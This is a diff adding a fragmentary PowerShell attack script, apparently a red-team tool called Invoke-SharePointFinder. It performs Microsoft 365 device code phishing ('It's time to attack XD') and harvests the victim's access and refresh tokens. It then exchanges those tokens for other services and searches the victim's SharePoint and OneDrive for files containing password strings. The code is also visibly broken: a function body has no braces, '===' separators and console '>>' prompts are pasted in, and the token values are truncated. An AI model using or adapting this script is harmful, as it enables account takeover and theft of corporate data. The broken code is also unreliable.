@@ -1,0 +1,421 @@
+function Invoke-SharePointFinder
+	param(
+        [Parameter(Mandatory = $false)][string]$Domain,
+	[Parameter(Mandatory = $false)][string]$AccessToken,
+	[Parameter(Mandatory = $false)][string]$RefreshToken,
+	[Parameter(Mandatory = $false)][switch]$Help,
+)
+
+	function Chaking-TanentID {
+	param (
+		[string]$Domain
+	)
+	
+	$Checking_Tenant_id_Url = "https://login.microsoftonline.com/$domain/v2.0/.well-known/openid-configuration"
+
+	try {
+		$Response_from_Checking_Tenant_id_Url = Invoke-RestMethod -Method GET -Uri $Checking_Tenant_id_Url
+		$Tenant_ID = $Response_from_Checking_Tenant_id_Url.issue -replace "https://login.microsoftonline.com/", "" -replace "/v2.0", ""
+		
+		Write-Host "[+] Found Tenant Id for: $Domain" -ForegroundColor Green
+		Write-Host "[+] Tenant ID: $Tenant_ID" -ForegroundColor Green
+		Write-Host "[+] :) :) :) :)" -ForegroundColor Green
+		return $Tenant_ID
+	}
+	catch {
+		Write-Host " "
+		Write-Host "[-] Did find Tenant ID for your Domain name.." -ForegroundColor Red
+		return $null
+	}
+
+}
+
+
+
+
+#Number One:
+
+# Device Code Phishing
+    if ($DeviceCodePhishing) {
+        $Client_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+        $Scope = ".default offline_access"
+        $body = @{
+            "client_id" = $Client_ID
+            "scope" = $Scope
+        }
+
+        $authResponse = Invoke-RestMethod -UseBasicParsing -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -Body $body
+        $deviceCodeFile = "$env:TEMP\device_code.json"
+        $authResponse | ConvertTo-Json | Set-Content -Path $deviceCodeFile
+
+        Write-Host "Device code for phishing:" -ForegroundColor Yellow
+        Write-Host "-------------------------" -ForegroundColor Yellow
+        Write-Host "Please visit: $($authResponse.verification_uri)" -ForegroundColor Blue
+        Write-Host "Enter this code: $($authResponse.user_code)" -ForegroundColor Blue
+		Write-Host "" -ForegroundColor Blue
+		Write-Host "It's time to attack XD" -ForegroundColor Blue
+        return
+    }
+
+
+# Device Code Results - Getting The tokens
+    if ($DeviceCodeResults) {
+        $deviceCodeFile = "$env:TEMP\device_code.json"
+
+        if (-not (Test-Path -Path $deviceCodeFile)) {
+            Write-Host "Error: No device code found. run -devicecodephishing to generate a code, Or wait for the victim to Enter The link" -ForegroundColor Red
+            return
+        }
+
+        $authResponse = Get-Content -Path $deviceCodeFile -Raw | ConvertFrom-Json
+
+        $body = @{
+            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
+            "device_code" = $authResponse.device_code
+        }
+
+        while ($true) {
+            try {
+                $TokenResponse = Invoke-RestMethod -UseBasicParsing -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body -ErrorAction Stop
+				Write-Host ""
+                Write-Host "Access Token:" -ForegroundColor Yellow
+                Write-Host "-------------" -ForegroundColor Yellow
+                Write-Host $TokenResponse.access_token -ForegroundColor Blue
+                Write-Host "Refresh Token:" -ForegroundColor Yellow
+                Write-Host "--------------" -ForegroundColor Yellow
+                Write-Host $TokenResponse.refresh_token -ForegroundColor Magenta
+
+                Remove-Item -Path $deviceCodeFile -Force
+                break
+            } catch {
+                if ($_.Exception.Response.StatusCode.Value__ -eq 400 -and $_.Exception.Response.StatusDescription -like "*authorization_pending*") {
+                    Write-Host "Waiting for authorization... polling for Access Token." -ForegroundColor Yellow
+                    Start-Sleep -Seconds 5
+                } else {
+                    Write-Host "An unexpected error occurred: $($_.Exception.Message)" -ForegroundColor Red
+                    break
+                }
+            }
+        }
+        return
+    }
+
+
+=============================================
+
+
+#Number Two - With the Refresh Token from Device Code Flow, requsting Access Token for https://webshell.suite.office.com/
+# Getting Access Token For Webshell.com
+
+$Url = "https://login.microsoftonline.com/tenant_id/oauth2/v2.0/token"
+
+$Headers = @{
+"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+"Referer" = "https://m365.cloud.microsoft/"
+"Origin" =  "https://m365.cloud.microsoft"
+"Content-Type" = "application/x-www-form-urlencoded;charset=utf-8"
+}
+
+$Client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+$Scope = "https://webshell.suite.office.com/.default"
+$grant_type = "refresh_token"
+$refresh_token = "1.AQQAGUvwznZ36hv3t1F"
+
+$Body = @{
+"client_id" = $Client_id
+"scope" = $Scope
+"grant_type" = $grant_type
+"refresh_token" = $refresh_token
+}
+
+$Token_Request = Invoke-RestMethod -Method Post -Uri $Url -Headers $Headers -Body $Body
+
+
+
+
+
+try {
+           $Token_Request = Invoke-RestMethod -UseBasicParsing -Method Post -Uri $Url -Body $Body
+            Write-Host "Access Token:" -ForegroundColor Cyan
+            Write-Host "-------------" -ForegroundColor Cyan
+            Write-Host $Token_Request.access_token -ForegroundColor Green
+            Write-Host "Refresh Token:" -ForegroundColor Yellow
+            Write-Host "--------------" -ForegroundColor Yellow
+            Write-Host $Token_Request.refresh_token -ForegroundColor Green
+        } catch {
+            Write-Host "Failed to retrieve tokens. Please check the provided refresh token and domain." -ForegroundColor Red
+        }
+        return
+    
+==============================================
+
+
+#Getting the Domain name for sharepoint.com:
+
+$url = "https://webshell.suite.office.com/api/myapps/GetAppDataCache?hasMailboxInCloud=true&culture=en-US"
+$Access_Token = "eyJ0eXAOiJSUzI1NiIsIng1dCI6Ik"
+ $Headers =@{
+>> "Authorization" = "Bearer $Access_Token"
+>> }
+$Resonse = Invoke-WebRequest -Uri $url -Headers $Headers
+$JsonResponse = $Resonse.Content | ConvertFrom-Json
+$Apps = $JsonResponse.FirstParty.Apps
+$sharepoint = $Apps | Where-Object {$_.LaunchFullUrl -match "sharepoint\.com" }
+$SharePointDomains = $sharepoint | ForEach-Object {
+if ($_ -match "https://([a-zA-Z0-9\-]+\.sharepoint\.com)") {
+>> $Matches[1]
+>> }
+} | Sort-Object -Unique
+$SharePointDomains
+
+=============================================
+
+
+
+#Now with the same refrsh token of Device code flow, requsting aniother access token for outlook (to find information in sharepoint):
+#Getting the Access Token for shareoint requesting:
+
+
+$Url = "https://login.microsoftonline.com/tenant_id/oauth2/token?api-version=1.0"
+$Resource = "https://outlook.office365.com/"
+$Client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+$Grant_Type = "refresh_token"
+$Refresh_Token = "1.AQQAGUvwznZ3lEq4mzdcd"
+$Scope = "openid"
+
+
+$Body = @{
+"resource" = $Resource
+"client_id" = $Client_id
+"grant_type" = $Grant_Type
+"refresh_token" = $Refresh_Token
+"scope" = $Scope
+}
+
+Invoke-RestMethod -Method Post -Uri $Url -Body $Body
+
+=============================================
+
+
+$uri = "https://outlook.office365.com/searchservice/api/v2/query"
+
+$headers = @{
+    "Sec-Ch-Ua-Platform" = "`"Windows`""
+    "Authorization" = "Bearer eyJ0eXAiOiJKV1QiLCJdGZ2"
+    "Sec-Ch-Ua" = "`"Chromium`";v=`"133`", `"Not(A:Brand`";v=`"99`""
+    "Accept-Language" = "en-US,en;q=0.9"
+    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+    "Accept" = "application/json"
+    "Content-Type" = "application/json"
+    "X-Client-Language" = "en-us"
+    "Origin" = "https://substrate.office.com"
+    "Sec-Fetch-Storage-Access" = "active"
+    "Referer" = "https://substrate.office.com/"
+    "Priority" = "u=1, i"
+}
+
+$body = @'
+{
+  "AnswerEntityRequests": [
+    {
+      "Query": {
+        "QueryString": "\"Aa123456\""
+      },
+      "EntityTypes": [
+        "Building",
+        "EditorialQnA",
+        "Bookmark",
+        "People",
+        "Acronym",
+        "External",
+        "TuringQnA",
+        "Topic"
+      ],
+      "From": 0,
+      "Size": 10,
+      "SupportedResultSourceFormats": [
+        "AdaptiveCard",
+        "EntityData",
+        "AdaptiveCardTemplateBinding"
+      ],
+      "PreferredResultSourceFormat": "AdaptiveCard",
+      "EnableAsyncResolution": true
+    }
+  ],
+  "EntityRequests": [
+    {
+      "EntityType": "File",
+      "ContentSources": [
+        "SharePoint",
+        "OneDriveBusiness"
+      ],
+      "Fields": [
+        ".callerStack",
+        ".correlationId",
+        ".mediaBaseUrl",
+        ".spResourceUrl",
+        ".thumbnailUrl",
+        "AuthorOWSUSER",
+        "ContainerTypeId",
+        "ContentClass",
+        "ContentTypeId",
+        "Created",
+        "DefaultEncodingURL",
+        "DepartmentId",
+        "Description",
+        "DocId",
+        "EditorOWSUSER",
+        "FileExtension",
+        "FileType",
+        "Filename",
+        "GeoLocationSource",
+        "HitHighlightedSummary",
+        "IsContainer",
+        "IsHubSite",
+        "LastModifiedTime",
+        "LinkingUrl",
+        "ListID",
+        "ModifiedBy",
+        "MediaDuration",
+        "ParentLink",
+        "Path",
+        "PiSearchResultId",
+        "PictureThumbnailURL",
+        "ProgID",
+        "PromotedState",
+        "RelatedHubSites",
+        "SPWebUrl",
+        "SecondaryFileExtension",
+        "ServerRedirectedPreviewURL",
+        "ServerRedirectedUrl",
+        "ShortcutUrl",
+        "SiteId",
+        "SiteLogo",
+        "SiteTemplateId",
+        "SiteTitle",
+        "Title",
+        "UniqueID",
+        "UniqueId",
+        "ViewCount",
+        "ViewsLifeTimeUniqueUsers",
+        "WebId",
+        "isDocument",
+        "isexternalcontent",
+        "ListTemplateTypeId",
+        "PrivacyIndicator",
+        "ColorHex",
+        "ModifierUPNs",
+        "InformationProtectionLabelId",
+        "SiteSensitivityLabelID"
+      ],
+      "Query": {
+        "QueryString": "\"Aa123456\"",
+        "DisplayQueryString": "\"Aa123456\"",
+        "QueryTemplate": ""
+      },
+      "Sort": [
+        {
+          "Field": "PersonalScore",
+          "SortDirection": "Desc"
+        }
+      ],
+      "EnableQueryUnderstanding": false,
+      "EnableSpeller": false,
+      "IdFormat": 0,
+      "EnableResultAnnotations": true,
+      "ResultsMerge": {
+        "Type": "Interleaved"
+      },
+      "FederationContext": {
+        "SpoFederationContext": {
+          "UserContextUrl": "https://domain.sharepoint.com/search"
+        }
+      },
+      "ExtendedQueries": [
+        {
+          "SearchProvider": "SharePoint"
+        }
+      ],
+      "HitHighlight": {
+        "HitHighlightedProperties": [
+          ""
+        ],
+        "SummaryLength": 200
+      }
+    }
+  ],
+  "Cvid": "11111111-1111-1111-1111-111111111111",
+  "LogicalId": "11111111-1111-1111-1111-111111111111",
+  "Culture": "en-us",
+  "UICulture": "en-us",
+  "TimeZone": "UTC",
+  "TextDecorations": "Off",
+  "Scenario": {
+    "Name": "officehome",
+    "Dimensions": [
+      {
+        "DimensionName": "QueryType",
+        "DimensionValue": "AllResults"
+      },
+      {
+        "DimensionName": "FormFactor",
+        "DimensionValue": "Web"
+      }
+    ]
+  },
+  "QueryAlterationOptions": {
+    "EnableSuggestion": true,
+    "EnableAlteration": true,
+    "SupportedRecourseDisplayTypes": [
+      "ServiceSideRecourseLink"
+    ]
+  },
+  "WholePageRankingOptions": {
+    "EnableEnrichedRanking": true,
+    "EnableLayoutHints": true,
+    "SupportedSerpRegions": [
+      "MainLine"
+    ],
+    "EntityResultTypeRankingOptions": [
+      {
+        "ResultType": "Answer",
+        "MaxEntitySetCount": 6
+      }
+    ],
+    "MultiEntityMerge": [
+      {
+        "EntityTypes": [
+          "File",
+          "External"
+        ],
+        "Size": 15,
+        "From": 0
+      }
+    ],
+    "SupportedRankingVersion": 1
+  }
+}
+'@
+
+
+
+$response = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $body -ContentType "application/json"
+
+Write-Output $response
+
+
+Write-Host "`n==== Search Results ====" -ForegroundColor Green
+
+$response.EntitySets | ForEach-Object {
+    $_.ResultSets | ForEach-Object {
+        $_.Results | ForEach-Object {
+            $source = $_.Source
+            Write-Host "`n==========================" -ForegroundColor Cyan
+            Write-Host "Filename    : " -NoNewline -ForegroundColor Yellow; Write-Host $source.Filename
+            Write-Host "FileType    : " -NoNewline -ForegroundColor Yellow; Write-Host $source.FileType
+	    Write-Host "link : " -NoNewline -ForegroundColor Yellow; Write-Host $source.OriginalPath
+        }
+    }
+}
+
